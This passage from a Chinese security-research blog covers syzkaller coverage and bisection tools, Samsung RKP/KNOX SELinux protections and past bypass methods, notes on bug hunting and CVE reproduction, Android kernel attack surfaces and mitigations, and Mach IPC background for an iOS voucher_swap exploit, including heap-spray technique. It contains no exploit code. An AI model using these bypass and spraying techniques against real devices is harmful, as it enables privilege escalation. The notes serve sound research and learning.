这些原始覆盖数据可以被送入syz-cover生成覆盖报告。 1./bin/syz-cover --kernel_obj &lt;directory where vmlinux is located&gt; rawcover 导出覆盖率的CSV文件。 1./bin/syz-cover --kernel_obj &lt;directory where vmlinux is located&gt; --csv &lt;filename where to export&gt; rawcover Syz-bisectsyz-bisect程序可以用来对syzkaller发现的崩溃和修复提交进行划分。它还可以识别触发崩溃的配置选项。 使用用make bisec编译syz-bisect。 在bisection过程中，根据不同的内核版本会使用不同的编译器。这些编译器可以在这里找到。 安装ccache以加快bisecton期间的内核编译速度。 使用create-image.sh创建用户空间（chroot）。 创建一个配置文件，并根据你的环境调整以下行数。 123456789101112131415161718192021222324252627282930313233{ &quot;bin_dir&quot;: &quot;/home/syzkaller/bisect_bin&quot;, &quot;ccache&quot;: &quot;/usr/bin/ccache&quot;, &quot;kernel_repo&quot;: &quot;git://git.kernel.org/pub/scm/linux/kernel/git/next/linux-next.git&quot;, &quot;kernel_branch&quot;: &quot;master&quot;, &quot;syzkaller_repo&quot;: &quot;https://github.com/google/syzkaller&quot;, &quot;userspace&quot;: &quot;/home/syzkaller/image/chroot&quot;, &quot;kernel_config&quot;: &quot;/home/syzkaller/go/src/github.com/google/syzkaller/dashboard/config/linux/upstream-apparmor-kasan.config&quot;, &quot;kernel_baseline_config&quot;: &quot;/home/syzkaller/go/src/github.com/google/syzkaller/dashboard/config/linux/upstream-apparmor-kasan-base.config&quot;, &quot;syzctl&quot;: /home/syzkaller/go/src/github.com/google/syzkaller/dashboard/config/linux/upstream.sysctl, &quot;cmdline&quot;: /home/syzkaller/go/src/github.com/google/syzkaller/dashboard/config/linux/upstream.cmdline, &quot;manager&quot;: { &quot;name&quot; : &quot;bisect&quot;, &quot;target&quot;: &quot;linux/amd64&quot;, &quot;http&quot;: &quot;127.0.0.1:56741&quot;, &quot;workdir&quot;: &quot;/home/syzkaller/workdir&quot;, &quot;kernel_obj&quot;: &quot;/home/syzkaller/linux&quot;, &quot;image&quot;: &quot;/home/syzkaller/workdir/image/image&quot;, &quot;sshkey&quot;: &quot;/home/syzkaller/workdir/image/key&quot;, &quot;syzkaller&quot;: &quot;/home/syzkaller/go/src/github.com/google/syzkaller_bisect&quot;, &quot;procs&quot;: 8, &quot;type&quot;: &quot;qemu&quot;, &quot;kernel_src&quot;: &quot;/syzkaller/linux&quot;, &quot;vm&quot;: { &quot;count&quot;: 4, &quot;kernel&quot;: &quot;/home/syzkaller/linux/arch/x86/boot/bzImage&quot;, &quot;cpu&quot;: 2, &quot;mem&quot;: 2048, &quot;cmdline&quot;: &quot;root=/dev/sda1 rw console=ttyS0 kaslr crashkernel=512M minnowboard_1:eth0::: security=none&quot; } }} 然后用bin/syz-bisect -config vm_bisect.cfg -crash /syzkaller/workdir/crashes/03ee30ae11dfd0ddd062af26566c34a8c853698d运行bisection。 Syz-bisect期望在给定的崩溃目录中找到 repro.cprog 或 repro.prog。它也会利用 repro.opts，但这并不是必须的。 额外的参数 -syzkaller_commit 使用特定版本的syzkaller。 -kernel_commit 内核提交，已知崩溃会重现。在修复提交时使用这个选项。 -fix 如果想对一个修复提交进行分流，可以使用这个选项。 输出在syz-bisect完成后，它会将结果转储到控制台，也会将结果存储到指定的崩溃目录中。 cause.commit 确定了导致崩溃的原因，或者文本 “该崩溃已经发生在最早的测试版本上”。 fix.commit 确定了修复崩溃的方法或文字&quot;the crash still happens on HEAD&quot;。 cause.config 配置选项被确定为导致崩溃的一个触发因素。 original.config、baseline.config、minimized.config 文件用于配置分流。","link":"/2022/04/17/syzkaller%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"三星笔记","text":"SELinux在Android4.3之前，Google使用应用程序沙盒作为Android安全模型，但是，在Android5.0之后，SELinux是Android系统中主要的安全机制，而且是默认启用的。 在Google Nexus和Pixel系列中，SELinux策略是被一个在内核中叫selinux_enforcing的可写的全局变量控制的。因此，如果selinux_enforcing为false，SELinux则不启用。 但是，三星Galaxy的SELinux策略不依赖于selinux_enforcing，因为三星自定义了SELinux策略，以隐藏原始的SELinux的缺点。基于原始的SELinux的权限管理，以下代码片段展示了添加到所有系统调用接口中的额外的完整性检查。\u0003 123456789struct cred { ...#ifdef CONFIG_RKP_KDP atomic_t *use_cnt; struct task_struct *bp_task; void *bp_pgd; unsigned long long type;#endif /*CONFIG_RKP_KDP*/} __randomize_layout; 首先，在cred结构体中，存在一些成员，如bp_task和bp_pgd用于SELinux的security_integrity_current函数。当安全环境中，新的凭证提交过来，或者被覆写，RKP将在bp_task中记录它的所有者信息，在bp_pgd中记录PGD信息。 1234567891011121314151617181920212223242526272829303132333435363738394041424344// security/security.c#define call_void_hook(FUNC, ...) \\ do { \\ struct security_hook_list *P; \\ \\ if(security_integrity_current()) break; \\ list_for_each_entry(P, &amp;security_hook_heads.FUNC, list) \\ P-&gt;hook.FUNC(__VA_ARGS__); \\ } while (0)#define call_int_hook(FUNC, IRC, ...) ({ \\ int RC = IRC; \\ do { \\ struct security_hook_list *P; \\ \\ RC = security_integrity_current(); \\ if (RC != 0) \\ break; \\ list_for_each_entry(P, &amp;security_hook_heads.FUNC, list) { \\ RC = P-&gt;hook.FUNC(__VA_ARGS__); \\ if (RC != 0) \\ break; \\ } \\ } while (0); \\ RC; \\})... // security/selinux/hooks.cint security_integrity_current(void){ rcu_read_lock(); if ( rkp_cred_enable &amp;&amp; (rkp_is_valid_cred_sp((u64)current_cred(),(u64)current_cred()-&gt;security)|| cmp_sec_integrity(current_cred(),current-&gt;mm)|| cmp_ns_integrity())) { rkp_print_debug(); rcu_read_unlock(); panic(&quot;RKP CRED PROTECTION VIOLATION\\n&quot;); } rcu_read_unlock(); return 0;} 如果启用了CONFIG_RKP_KDP，则security_integrity_current函数生效，security_integrity_current函数将用于校验进程的cred安全上下文。简单来讲，它将做以下几件事： 进程描述符中的cred和安全性是否在RKP保护的只读内存区域中进行分配。 bp_cred和cred是否始终不允许被修改。 bp_task是否是这个进程。 mm-&gt;pgd和cred-&gt;bp_pgd是否不变。 current-&gt;nsproxy-&gt;mnt_ns-&gt;root和current-&gt;nsproxy-&gt;mnt_ns-&gt;root -&gt;mnt-&gt;bp_mount是否不变。 三星还将SELinux相关的数据，如cred-&gt;security，task_security_struct和selinux_ops放在RKP保护的只读内存区域中，以阻止攻击者通过AAW原语进行修改。 以上是关于三星自定义的SELinux的功能的简要描述。 SELinux还有一些其他作用，它可以用于评估漏洞，比如，在isolated_app上下文中触发的漏洞，比在untrusted_app上下文中触发的漏洞要更有价值。 我们可以通过检查以下命令，来查看这个信息 12adb pull /sys/fs/selinux/policysesearch --allow policy | grep -v &quot;magisk&quot; | grep &quot;isolated_app&quot; 历史三星Galaxy漏洞利用之前的KNOX绕过漏洞利用，又一个很好的文章x82’s slide at POC 2019。 KNOX2.6（Samsung Galaxy S7）blackhat USA 2017 slide from KeenLab，给出了新的绕过DFI和SELinux的方式。 首先，调用 rkp_override_creds 以一些复杂的方式去覆盖自己的cred，尽管RKP在 rkp_override_creds中执行来 uid_checking。 然后使用 orderly_poweroff 函数，结合修改过的 poweroff_cmd 去调用 call_usermodehelper 函数，去创建高权限进程。因此，在获取到拥有高权限的进程之后，再调用 rkp_override_creds 去更改它的cred信息。 KNOX2.8（Samsung Galaxy S8）下载模式关机，然后，插入USB，同时按住音量下键+bixy键，出现警告页面，按音量上键确认。操作有点玄学，可能得多试几次。 刷机插入USB前，应提前打开奥丁。然后同时按住Bixy+电源下键+电源键；按住的一瞬间插入USB；出现提示页面后按电源上键进入下载页面。 在奥丁中，选择对应开头的的文件即可，AP选择patch的magisk包。 开始即可。 拨号输入*#1234#，看版本号，左数起数字后45位，如SX就是版本号，SX=UX没区别，不同版本会有两种字母显示。 固件包内容 BL(Bootloader) ： 代表 引导程序 AP (Application Processor or PDA) 表示Android系统（可能代表Android系统分区）; 在之前的Odin版本中，这被称为“PDA” CP(Core Processor） 代表 调制解调器 CSC(Co numer Software Customization) 代表 消费者软件定制，它包含特定于该地区的软件包，运营商品牌和APN设置（就像不同的运营商的数据接入点名称不通）。 PIT (Partition Information Table) 代表 分区信息表，如果你搞砸分区表，或者由于分区表布局的变化，你只需要用它就好了。 如果想要完全刷掉手机，使用CSC，如果想要保留数据，使用HOME_CSC。 直接解压AP，后缀lz4表示是使用lz4进行压缩的，解压使用lz4 -d system.img.lz4。 boot.img包含两部分，分别为kernel 和ramdisk。 dtbo.img设备树镜像，BootLoader（通常是uboot）一般与dtb文件相配合，以告知Linux有关驱动节点。 recovery.img从本质上说，recovery.img和boot.img基本一样。这就意味着，recovery.img也是Linux内核（zImage）和内存磁盘镜像（ramdisk.img）组成的。这两个镜像中的Linux内核是完全一样的，区别只是ramdisk.img中的少部分文件存在差异： 最主要的差异是recovery.img和ramdisk.img中的sbin目录中多了一个recovery命令进入Recovery主界面，而不会正常启动Android系统。 实现的原理是： Recovery.img和boot.img在自己的分区各自有一个Linux内核（zImage），彼此的Linux内核调用的init命令解析的init.rc及其相关文件的内容有一定的差异。 而Bootloader根据用户的选择决定使用boot.img中Linux内核，还是使用Recovery.img中的Linux内核启动系统。如果使用前者，Android系统就会正常启动，如果使用后者，就会进入Recovery选择菜单，所以recovery.img和boot.img的第二个差异就是其中的init.rc及其相关配置文件的内容略有不同。 从前面的描述还可以看出，recovery.img和boot.img其实都是一个最小的运行系统，也就是说他们都各自带一个满足最低要求的运行环境（ramdisk.img）。boot.img利用这个运行环境监理更大的运行环境（system.img） ，而recovery.img就直接使用了这个运行环境进行基本的操作（复制文件、删除文件、加压文件、mount等），这些操作也就是Recovery模式下刷机要进行的一些操作。 cache.img缓存镜像用于存储系统或用户应用产生的临时数据，通常的镜像文件名为chche.img。 一般ROM并不需要包含缓存镜像。","link":"/2022/04/15/%E4%B8%89%E6%98%9F%E7%AC%94%E8%AE%B0/"},{"title":"我的漏洞学习笔记📙","text":"前言漏洞的学习要有连续性，多记录，多总结，多回顾。 🌟漏洞学习方法以下要说的漏洞挖掘方法都是从OffensiveCon22 - Mark Dowd- Keynote -How Do You Actually Find Bugs?学的，个人感觉是贴合实际的，也很具有可执行性。 1、心态耐心、毅力、细心、思考、好奇心 要有一个积极的心态，就是当发现代码的逻辑与自己的理解有很大不同时，能接受失败，从头再来。 漏洞挖掘就是一个不断失败的过程。 如何处理失败？ 两个项目同时进行，这两个项目可以是相同代码的不同组件，当一个项目到达瓶颈时，搁置一段时间，进行另一个项目； 第二个项目最好是开发项目，开发容易获得成就感。 知道什么时候该结束 当切换了几次，还是无法突破瓶颈时； 一直持续到针对一个问题，会很容易打击积极性和信息。 不要在意沉没成本，可以当作只是暂时搁置，时机合适时再来，这需要对已做的工作做好记录，防止下次进入时又从头再来； 而且，过段时间再来，代码可能就由于更新引入了新的问题。 不要想着一口吃个胖子，思考很重要，只有主动思考代码的实现思想，才能减少审计时间，就是主动去猜去想。 补丁 审计时发现补丁说明思考的路径是正确的，还有助于理解问题与解决问题。 信心初次踏入安全研究会很容易不自信，应该从小处做起，逐渐扩大，以增加信心。 偏见和假设这些思想不要有： 有很多人审计过这一块了； 其实可能并没有。 即使我能发现问题，也是不可利用的； 缓解措施或许可以绕过。 XXX攻击面现在已经过时了； 这儿没什么bugl； 变体或代码重新引入bug。 协议不允许做XXX动作。 不要一开始就阅读文档手册，会影响想象力，当审计遇到模棱两可的时候，在看手册。 2、审计流程 试图理解代码，理解代码以后，才能更好地写出漏洞利用； 一般都想要缩短这个过程，借助工具、fuzz、静态分析等，这些有用，但是很依赖于工具本身。 理解一件事最好的方式是向他人讲解这个东西； 写文章或是找个人分享。 寻找什么？软件风险点 = 供给面X复杂度（漏挖之友） 攻击面可以是间接的，隐藏或不明显的攻击面是最好的，供应商自定义的那些。 复杂度： 新的功能； 对旧东西的兼容； 为了开发简单，使用现有库等，引入自己不需要的东西，如log4j。 借用想法 bugtracker/diff，关注经常写bug的那个人的提交； 看看公开漏洞，借鉴思路，复现思路，自动化。 记录自己的发现想法、bug条件、数据结构、算法等等都可以，记录失败的想法及原因，避免再犯这个错误。 广泛的应用自己的知识审计复杂的组件时，去看看其他人如何实现它的，还有，当难以理解组件时，可以查看不同的代码库，说不定能理解。 重启失败的项目重启之前失败的审计或bug，代码会被重写，会添加新特性，执行环境也会变，查看当时不可行的bug，现在是否依然不可行。 3、分析失败 同一块代码为什么别人成功而你没有？ 试着找出：我忽视了什么？ 这是一个有用的技巧或是自己盲点吗？ 通过这个能有所提高吗？ 这个错误是一种模式吗？ 4、借助工具工具、fuzz、静态分析等可以节省大量时间，但别迷失在工具中，开发一个fuzz不要急于求成，可以让其慢慢成长，工具与代码审计之间要找到平衡。 🌟代码审计🌟漏洞复现CVE-2020-0108要想实现自动化，这个漏洞需要： 构造输入，触发异常； 在应用程序端接受异常； 判断是否可利用。 CVE-2021-0694下面是已知的一些信息： BG-FGS-start while-in-use权限限制的改进。 从后台启动的前台服务不应具有while-in-use的访问权限，如定位/摄像/麦克风。 以前我们只在服务启动时通过startService()或bindService()命令设置mAllowWhileInUsePermissionInFgs。但是在 服务启动后，Service.startForeground()的调用可能会在一段时间后进行。而那个时候，调用者可能已经不在前台了。这个 CL将在此基础上增加进一步的限制： 如果第一次调用Service.startForeground()超过10秒（可由DeviceConfig键 fgs_start_foreground_timeout 配置）。Context.startService()调用后，检查服务的应用程序状态并设置 mAllowWhileInUsePermissionInFgs。 在Service.stopForeground()调用时，mAllowWhileInUsePermissionInFgs 应该被重置为false，这样FGS的while-in-use的权限就不被允许了。 在Context.startForegroundService()(或Context.startService())之后-&gt; Service.startForeground() -&gt; Service.stopForeground()，第二次或更多次 调用Service.startForeground()，检查该服务的 app proc状态，并再次设置mAllowWhileInUsePermissionInFgs。 复现情况可以看出问题应该与mAllowWhileInUsePermissionInFgs有关，但是奈何对service的启动还有框架源码的理解不够，写不出来poc。暂时先搁置一下，再看看有没有类似的漏洞，找找思路，或者是再积累一些知识。 又试了一下，还是不对，可能需要看看源码了。 poc写了，也跑了一下，当程序不在前台时获取录音，也成功了，但是不好证伪，因为，官方的Android11镜像应该都是没有修复的，而漏洞又只影响Android11，所以不好去测试补丁后的情况。 CVE-2019-2225配置错误导致的严重漏洞，也很有意思，关键是可以通过应用程序直接进行攻击 CVE-2020-0069驱动漏洞： https://www.anquanke.com/post/id/217231 https://forum.xda-developers.com/t/amazing-temp-root-for-mediatek-armv8-2020-08-24.3922213/ https://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html https://github.com/quarkslab/CVE-2020-0069_poc 🌟工具开发Android静态漏洞扫描工具以soot为基础进行的，现在也只进行到能获取一些AndroidManifest数据，没有进行到下一步的原因是：一是想做界面，但是和Java后端又不会，成本很高；二是，还没有想好要怎么继续分析，或者说功能要怎么开发。 💡想法虽然PendingIntent增加了PendingIntent.FLAG_IMMUTABLE标志，但是，可以想办法监听系统中发送的PendingIntent，看哪个倒霉催的程序员不适用这个标志，或许这种漏洞真是绝了，也说不定。 Android内核知识1、Android内核简介 EL0层：普通Application、TA (Trusted Application)； EL1层：Linux内核 (Guest OS)、TEE内核 (Trusted OS)； EL2层：Hypervisor (No Hypervisor in Secure World)； EL3层：Secure Monitor； 不同的EL对应不同的权限，不同的寄存器，高权限的行为在低EL上是不能执行的； 常见安全问题：低权限攻击高权限、非安全侧攻击安全侧。 2、内核内存 单个进程角度：低地址为user内存，高地址（TASK_SIZE以上）为kernel内存； 系统角度：内核地址是共享的，各个进程地址隔离。 3、内核接口 EL0调用EL1方法：通过中断指令，内核进入中断向量表，再通过系统调用号进入各类系统调用； ARM中的指令：svc； libc.so里面所有系统调用都会用到DO_CALL这个宏，包括但不限于：open, read, write, fork, ioctl等； 虚拟文件系统（VFS）：所有的驱动程序都是通过文件进行调用的。 4、识别攻击面 入口：/dev、/proc等驱动，系统调用； 内存操作函数：put_user, get_user, copy_to_user, clear_user, copy_from_user, strncpy_from_user； 驱动：经常用到的比如字符设备驱动、网络设备驱动以及NetLink等 重要结构体：file_operations； read/write函数：内核VFS框架里，count是被校验过的； ioctl：arg是一个指针，没有标准的类型，VFS框架无法校验，如何使用全部取决于开发人员； mmap：内核驱动需实现xxxx_mmap，最终调用到remap_pfn_range。 5、内核缓解机制 KASLR：内核地址随机化； NX：数据区不可执行； 栈Cookie：返回地址之前的随机数，覆盖返回地址之前会先覆盖Cookie； SELinux：基于策略的保护方式； PXN：内核态不能执行用户态地址的代码； PAN：内核态不能访问用户态地址数据； CFI：控制流完整性，只有特定流才能调用。 Android应用沙盒机制1、DAC沙盒 Android上的App并不像Linux上的用户程序那样，启动应用的uid默认就是登录用户的uid，除非你使用sudo或者setuid等机制。而是每个Android应用都对应了一个uid，也就是一个用户，通过Linux系统的DAC机制将应用的数据严格隔离开来。 Android并没有使用/etc/passwd配置文件以及useradd、usermod和userdel等二进制来管理用户。实际上Android应用到uid的映射是由PackageManagerService完成的，也就是PMS，并且存储在/data/system/packages.xml中。 将Android应用使用DAC隔离开之后，如果应用要访问任何系统资源，便会被拒绝，所以Android设计了应用权限机制来向应用提供访问系统资源的通道，同时保护系统资源不被滥用。 2、应用权限 Android应用权限的核心类型分为四种：普通权限、危险权限、签名权限、签名或系统权限。 权限类型 权限行为 普通权限(Normal) 普通权限是只需要在AndroidManifest.xml中声明后就可以使用的权限 危险权限(dangerous) 危险权限除了需要在AndroidManifest.xml中声明之外，在Android 6.0或更高版本还需要使用动态权限API进行申请，并且用户点击同意之后才能使用；在Android 5.1以及更早版本，会在安装时单独列出危险权限以特别提醒用户。注意，如果自定义权限设置为了危险权限，无论Android版本是多少都只是会在安装时单独列出危险权限。 签名权限(signature) 签名权限仅会授予给与定义这个权限的包相同签名的应用。 签名或系统权限(signatureOrSystem) `signature 在自定义权限中，经常使用signature权限来保护敏感的接口，使其只能被可信的应用调用——那些具备和定义权限者相同签名的应用，如果使用的是signatureOrSystem，这个权限还可以被授予给特权应用。 3、应用信息的存储 应用信息的存储位于/data/system/packages.xml中，这里面存储了应用的各种信息，下面是一个示例： 1234567891011121314151617181920&lt;package name=&quot;com.android.storagemanager&quot; codePath=&quot;/system/priv-app/StorageManager&quot; nativeLibraryPath=&quot;/system/priv-app/StorageManager/lib&quot; publicFlags=&quot;541605445&quot; privateFlags=&quot;8&quot; ft=&quot;165151eba60&quot; it=&quot;165151eba60&quot; ut=&quot;165151eba60&quot; version=&quot;29&quot; userId=&quot;10036&quot; appUseNotchMode=&quot;0&quot; appUseSideMode=&quot;1&quot; hwExtraFlags=&quot;0&quot; isOrphaned=&quot;true&quot; forceDarkMode=&quot;2&quot;&gt; &lt;sigs count=&quot;1&quot; schemeVersion=&quot;1&quot;&gt; &lt;cert index=&quot;13&quot; /&gt; &lt;/sigs&gt; &lt;perms&gt; &lt;item name=&quot;android.permission.USE_RESERVED_DISK&quot; granted=&quot;true&quot; flags=&quot;0&quot; /&gt; &lt;!-- ... --&gt; &lt;/perms&gt; &lt;proper-signing-keyset identifier=&quot;3&quot; /&gt;&lt;/package&gt;&lt;package name=&quot;com.android.settings&quot; codePath=&quot;/system/priv-app/Settings&quot; nativeLibraryPath=&quot;/system/priv-app/Settings/lib&quot; publicFlags=&quot;675823173&quot; privateFlags=&quot;8&quot; ft=&quot;165151eba60&quot; it=&quot;165151eba60&quot; ut=&quot;165151eba60&quot; version=&quot;10010400&quot; sharedUserId=&quot;1000&quot; appUseNotchMode=&quot;0&quot; appUseSideMode=&quot;1&quot; hwExtraFlags=&quot;0&quot; isOrphaned=&quot;true&quot; forceDarkMode=&quot;2&quot;&gt; &lt;sigs count=&quot;1&quot; schemeVersion=&quot;1&quot;&gt; &lt;cert index=&quot;0&quot; /&gt; &lt;/sigs&gt; &lt;perms&gt; &lt;item name=&quot;android.permission.REAL_GET_TASKS&quot; granted=&quot;true&quot; flags=&quot;0&quot; /&gt; &lt;!-- ... --&gt; &lt;/perms&gt; &lt;proper-signing-keyset identifier=&quot;1&quot; /&gt;&lt;/package&gt; 可以看到这个文件中存储有很多内容，最关键的信息包括应用的uid、包名、各类路径，以及定义和授予的权限。 4、应用权限的映射Android使用的是Linux内核，而在Linux的安全模型中，如果需要访问系统资源，访问系统资源的用户和进程必须具备相应的权限。如何将自行定义的Android权限映射到Linux层面的权限呢？答案就位于/etc/permissions/platform.xml中，下面是该文件的节选： 123456&lt;permission name=&quot;android.permission.BLUETOOTH_ADMIN&quot; &gt; &lt;group gid=&quot;net_bt_admin&quot; /&gt;&lt;/permission&gt;&lt;permission name=&quot;android.permission.BLUETOOTH&quot; &gt; &lt;group gid=&quot;net_bt&quot; /&gt;&lt;/permission&gt; Android的两个蓝牙权限，分别对应了net_bt_admin和net_bt两个Linux组，在应用被授予相应的权限时，PMS会自动将应用uid加入这两个组中，这样应用就拥有了相应系统资源的访问权限了。 5、应用的SELinux标签在Android引入SELinux之后，对应用权限的划分更为细致，Android默认将应用分为四种：不可信应用、特权应用、平台应用和系统应用。 SELinux标签 标签行为 app_domain 所有应用的SELinux标签都继承于此 isolated_app 在Manifest中配置了isolatedProcess=true的服务进程，几乎没有特权，最典型的例子是WebView和浏览器的渲染进程 ephemeral_app 所有用户使用的免安装应用都属于此标签，权限低于一般的第三方应用 untrusted_app_all 所有用户安装的应用都属于此标签，还包括一部分预装应用 untrusted_app_29 targetSdkVersion = 29的不可信应用 untrusted_app_27 25 &lt; targetSdkVersion &lt;= 28的不可信应用 untrusted_app_25 targetSdkVersion &lt;= 25的不可信应用 priv_app 带有Privileged标记的预装应用，一般安装在/system/priv-app中，不可卸载，但不以system uid运行 platform_app 具备平台签名，但不以system uid运行的应用。除了AOSP和部分第三方ROM之外，几乎所有的OEM都不会公开其平台私钥，所以一般情况下平台应用只能是OEM提供的 system_app 既具备平台签名，又以system uid运行(配置android:sharedUserId=”android.uid.system”)的应用。使用system uid运行意味着它们实际不受应用沙盒的限制，并能访问绝大部分Android框架中的系统资源 具体的配置路径为：aosp/system/sepolicy/，也可以看git上的信息：https://android.googlesource.com/platform/external/sepolicy/。 6、MAC沙盒上面所说的SELinux标签，Android在源代码中为它们定义了不同的SELinux政策，这便实现了MAC层面的沙盒增强。这些政策的路径如下： 1234567891011system/sepolicy/public/app.tesystem/sepolicy/private/app.tesystem/sepolicy/private/isolated_app.tesystem/sepolicy/private/ephemeral_app.tesystem/sepolicy/private/untrusted_app_all.tesystem/sepolicy/private/untrusted_app_29.tesystem/sepolicy/private/untrusted_app_27.tesystem/sepolicy/private/untrusted_app_25.tesystem/sepolicy/private/priv_app.tesystem/sepolicy/private/platform_app.tesystem/sepolicy/private/system_app.te 一般来说不建议App层面直接访问具备独立标签的用户态进程或者内核驱动，因为App的SELinux标签划分并非像UID一样细致，如果这样做会导致授予某一个应用权限的时候必须授予应用所在的整个标签权限，违反权限最小化原则。","link":"/2022/06/25/%E6%88%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%F0%9F%93%99/"},{"title":"从voucher_swap漏洞开始学iOS内核利用","text":"前言准备工作背景知识Mach消息Mach IPC，从Mach微内核派生而来，是最快的IPC机制之一。 Mach IPC基于单向通信。 Mach IPC中的通信以Mach消息的形式在端口之间进行，根据消息头中设置的特定位，消息可以是简单的也可以是复杂的。 发送和接收消息必须具有相应的端口权限： MACH_PORT_RIGHT_SEND-允许发送消息 MACH_PORT_RIGHT_RECEIVE-允许接收消息 MACH_PORT_RIGHT_SEND_ONCE-允许发送一次消息 MACH_PORT_RIGHT_PORT_SET-面向一组端口接收或发送消息 MACH_PORT_RIGHT_DEAD_NAME-表示因为对应的端口被销毁或者已经发送了一次消息从而无效的SEND或者SEND_ONCE权限 Mach端口权限可以嵌入并通过Mach消息发送。 一个端口可以有多个发送权限，但只有一个接收权限。发送权限可以克隆，接收权限不能。 发送的Mach消息在接收方收到之前，将保存在内核的队列中。 iOS中最重要的二进制文件之一launchd充当引导服务器并允许进程之间相互通信。launchd可以帮助一个进程查找另一个进程，因为所有进程都通过launchd启动并在启动时注册。因此，launchd可以实现节流（throttling）并在某些情况下允许或拒绝查找，从而充当安全控件。launchd非常重要，是第一个启动的守护进程（PID为1），launchd中的任何crash将立即触发内核Panic。 消息由进程内的线程发送和接收，充当进程内的执行单元，但是，端口权限保留在任务级别，并可在任务的ipc_space中找到。 简单消息简单消息的body会被内核忽略，osfmk/mach/message.h： 12345678910111213141516171819202122232425262728typedef struct{ mach_msg_size_t msgh_descriptor_count;} mach_msg_body_t;#define MACH_MSG_BODY_NULL (mach_msg_body_t *) 0#define MACH_MSG_DESCRIPTOR_NULL (mach_msg_descriptor_t *) 0typedef struct { mach_msg_bits_t msgh_bits; // 包含消息属性的位图 mach_msg_size_t msgh_size; // header+body的大小 mach_port_t msgh_remote_port; // 目标端口的发送权限 mach_port_t msgh_local_port; // 接收端口的接收权限 mach_port_name_t msgh_voucher_port; // voucher用于通过键值对传递消息中的数据 mach_msg_id_t msgh_id; // 任意32位值} mach_msg_header_t;#define msgh_reserved msgh_voucher_port#define MACH_MSG_NULL (mach_msg_header_t *) 0typedef struct{ mach_msg_header_t header; mach_msg_body_t body;} mach_msg_base_t;typedef unsigned int mach_msg_bits_t; mach_msg_bits_t取值的定义： 123456789101112131415161718192021222324#define MACH_MSGH_BITS_ZERO 0x00000000#define MACH_MSGH_BITS_REMOTE_MASK 0x0000001f#define MACH_MSGH_BITS_LOCAL_MASK 0x00001f00#define MACH_MSGH_BITS_VOUCHER_MASK 0x001f0000#define MACH_MSGH_BITS_PORTS_MASK \\ (MACH_MSGH_BITS_REMOTE_MASK | \\ MACH_MSGH_BITS_LOCAL_MASK | \\ MACH_MSGH_BITS_VOUCHER_MASK)#define MACH_MSGH_BITS_COMPLEX 0x80000000U /* message is complex */#define MACH_MSGH_BITS_USER 0x801f1f1fU /* allowed bits user-&gt;kernel */#define MACH_MSGH_BITS_RAISEIMP 0x20000000U /* importance raised due to msg */#define MACH_MSGH_BITS_DENAP MACH_MSGH_BITS_RAISEIMP#define MACH_MSGH_BITS_IMPHOLDASRT 0x10000000U /* assertion help, userland private */#define MACH_MSGH_BITS_DENAPHOLDASRT MACH_MSGH_BITS_IMPHOLDASRT#define MACH_MSGH_BITS_CIRCULAR 0x10000000U /* message circular, kernel private */#define MACH_MSGH_BITS_USED 0xb01f1f1fU 如果MACH_MSGH_BITS_COMPLEX没有打开，内核将假定消息的主体不包含端口权限或 OOL 数据，用户任务在解析消息主体时需要小心，因为消息主体中的mach_msg_type可能会对内容 “撒谎”，从而可能导致未定义的行为。 MACH_MSGH_BITS_REMOTE决定如何解释msg_remote_port字段，处理类似于msgt_name，结果必须是send或者send-once类型的权限。 MACH_MSGH_BITS_LOCAL决定如何解释msgh_local_port字段，处理方式与msgt_name类似，结果也必须是send或者send-once类型的权限。 MACH_MSGH_BITS_VOUCHER决定如何解释msgh_voucher_port字段，处理方式与msgt_name类似，结果必须是一个发送权（而且msgh_voucher_port字段必须是一个Mach voucher内核对象的发送权的名称）。 MACH_MSGH_BITS()结合了两个MACH_MSG_TYPE_*值，用于远程和本地字段，变成一个适合msgh_bits的单一值。 MACH_MSGH_BITS_CIRCULAR应该是零；是内部使用的。 未使用的位应该是零，保留给内核或未来的接口扩展。 除了header，还包含一些描述符，在消息主体中指定了描述符的数量（msgh_descriptor_count），BUILD/obj/EXPORT_HDRS/osfmk/mach/message.h： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#if defined(__LP64__) &amp;&amp; defined(KERNEL)typedef union{ mach_msg_port_descriptor_t port; mach_msg_ool_descriptor32_t out_of_line; mach_msg_ool_ports_descriptor32_t ool_ports; mach_msg_type_descriptor_t type;} mach_msg_descriptor_t;#elsetypedef union{ mach_msg_port_descriptor_t port; mach_msg_ool_descriptor_t out_of_line; mach_msg_ool_ports_descriptor_t ool_ports; mach_msg_type_descriptor_t type;} mach_msg_descriptor_t;#endiftypedef struct{ mach_msg_size_t msgh_descriptor_count;} mach_msg_body_t;#define MACH_MSG_BODY_NULL (mach_msg_body_t *) 0#define MACH_MSG_DESCRIPTOR_NULL (mach_msg_descriptor_t *) 0typedef struct { mach_msg_bits_t msgh_bits; mach_msg_size_t msgh_size; mach_port_t msgh_remote_port; mach_port_t msgh_local_port; mach_port_name_t msgh_voucher_port; mach_msg_id_t msgh_id;} mach_msg_header_t;#define msgh_reserved msgh_voucher_port#define MACH_MSG_NULL (mach_msg_header_t *) 0typedef struct{ mach_msg_header_t header; mach_msg_body_t body;} mach_msg_base_t; mach_msg_type_descriptor_t表示是什么类型的描述符，其他字段则包含相应的数据，类型如下： 1234567891011121314151617181920212223/* * 在一个复杂的mach消息中，mach_msg_header_t后面是一个描述符计数，然后是一个包含该数量描述符的数组(mach_msg_*_descriptor_t) * mach_msg_type_descriptor_t字段表示该描述符的类型 * * 注意，在LP64中，各种类型的描述符不再都是与mach_msg_descriptor_t相同的大小，所以数组不能像预期的那样被索引。 */typedef unsigned int mach_msg_descriptor_type_t;#define MACH_MSG_PORT_DESCRIPTOR 0 // 在消息中发送一个端口#define MACH_MSG_OOL_DESCRIPTOR 1 // 在消息中发送OOL数据#define MACH_MSG_OOL_PORTS_DESCRIPTOR 2 // 在消息中发送OOL端口数组#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR 3 // 在消息中发送易失性数据#pragma pack(4)typedef struct{ natural_t pad1; mach_msg_size_t pad2; unsigned int pad3 : 24; mach_msg_descriptor_type_t type : 8;} mach_msg_type_descriptor_t; OOL指Out-of-line，OOL端口描述符广泛应用于使用用户控制的数据来进行堆喷。每当使用MACH_MSG_OOL_DESCRIPTOR时，将在内核堆中分配具有所有端口指针的数组。 端口在用户态中用mach_port_t或mach_port_name_t表示，但内核中不采用这种表示。 